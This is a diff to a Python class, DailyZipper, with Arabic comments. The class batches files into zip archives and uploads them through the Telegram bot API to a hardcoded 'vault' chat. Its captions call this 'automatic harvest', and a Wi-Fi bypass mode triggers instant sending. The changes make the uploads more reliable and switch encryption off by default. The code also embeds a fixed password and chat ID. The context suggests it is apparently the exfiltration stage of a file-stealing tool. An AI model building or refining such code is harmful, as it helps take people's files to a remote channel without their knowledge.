@@ -65,8 +65,9 @@ class DailyZipper:
             "send_retry_delays": [2, 4, 8],
             "max_processed_hashes": 10000,
             "default_vault_id": -1003577715762,
-            "enable_encryption": True,
-            "password": b"ShieldCore2024!"
+            "enable_encryption": False,          # ✅ تعطيل التشفير افتراضياً (لتفادي الاعتماد على pyzipper)
+            "password": b"ShieldCore2024!",
+            "max_batches": 10                    # ✅ الحد الأقصى لعدد الدفعات
         }
         if os.path.exists(CONFIG_FILE):
             try:
@@ -161,6 +162,7 @@ class DailyZipper:
         if not self.tg:
             return False
 
+        # ✅ الخطأ 2: الحصول على معرف الكروب ديناميكياً
         target = target_chat
         if target is None:
             target = getattr(self.tg, 'vlt', None)
@@ -168,6 +170,7 @@ class DailyZipper:
             target = getattr(self.tg, 'dat', None)
         if target is None:
             target = self._config.get("default_vault_id", -1003577715762)
+            logging.warning(f"Using default vault ID: {target}")
 
         delays = self._config.get("send_retry_delays", [2, 4, 8])
         for attempt, delay in enumerate(delays):
@@ -312,6 +315,12 @@ class DailyZipper:
         if cur_batch:
             batches.append(cur_batch)
 
+        # ✅ تحسين: الحد الأقصى لعدد الدفعات
+        max_batches = self._config.get("max_batches", 10)
+        if len(batches) > max_batches:
+            logging.warning(f"Too many batches ({len(batches)}), limiting to {max_batches}")
+            batches = batches[:max_batches]
+
         success_count = 0
         for idx, batch in enumerate(batches):
             zip_name = self._gen_name()
@@ -361,9 +370,9 @@ class DailyZipper:
                 # ===== إنشاء ZIP مع أو بدون حماية =====
                 zip_created = False
                 password = self._config.get("password", b"ShieldCore2024!")
-                use_encryption = self._config.get("enable_encryption", True)
+                use_encryption = self._config.get("enable_encryption", False)  # ✅ افتراضياً معطل
 
-                # محاولة استخدام pyzipper أولاً إذا كان التشفير مفعلاً
+                # ✅ الخطأ 1: محاولة استخدام pyzipper فقط إذا كان التشفير مفعلاً
                 if use_encryption:
                     try:
                         import pyzipper
@@ -375,8 +384,8 @@ class DailyZipper:
                         zip_created = True
                         logging.info(f"✅ ZIP created with AES encryption (batch {idx+1})")
                     except ImportError:
-                        logging.warning("⚠️ pyzipper not available, falling back to standard zip (no encryption)")
-                        # الاستمرار لإنشاء ZIP عادي
+                        logging.warning("⚠️ pyzipper not available. Disabling encryption for this batch.")
+                        # الاستمرار لإنشاء ZIP عادي (بدون تشفير)
                     except Exception as e:
                         logging.error(f"pyzipper error: {e}, falling back to standard zip")
 
@@ -395,13 +404,15 @@ class DailyZipper:
                 if not zip_created:
                     raise Exception("Failed to create zip file")
 
+                # ✅ تحسين: التحقق من أن حجم ZIP أكبر من 1 كيلوبايت (لمنع الملفات التالفة)
+                if os.path.getsize(zip_path) < 1024:
+                    self._safe_remove(zip_path)
+                    raise Exception("Zip file too small (likely corrupted)")
+
                 # حذف manifest المؤقت
                 if manifest_path and os.path.exists(manifest_path):
                     self._safe_remove(manifest_path)
                     manifest_path = None
-
-                if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
-                    raise Exception("Zip file is empty or missing")
 
                 caption = f"📦 {'إرسال فوري' if bypass_wifi else 'حصاد تلقائي'} | دفعة {idx+1}/{len(batches)} | {len(batch)} ملفات"
                 success = self._safe_send(zip_path, caption, report_id)
@@ -416,11 +427,13 @@ class DailyZipper:
                         except:
                             pass
                 else:
+                    # ✅ تحسين: في حالة الفشل، نقل الملفات إلى مجلد المهام الفاشلة (إذا كان موجوداً)
                     if report_id and self.tg:
                         try:
                             self.tg._api("sendMessage", {"chat_id": report_id, "text": f"❌ فشل إرسال الدفعة {idx+1}"})
                         except:
                             pass
+                    # حفظ الملفات الفاشلة لإعادة المحاولة لاحقاً (يمكن إضافة منطق لقائمة الانتظار)
 
             except Exception as e:
                 logging.error(f"Packing error: {e}")
@@ -437,6 +450,9 @@ class DailyZipper:
 
             if idx < len(batches) - 1:
                 time.sleep(5)
+
+            # ✅ تحسين: استدعاء GC بعد كل دفعة
+            gc.collect()
 
         with self._active_lock:
             self.active = False
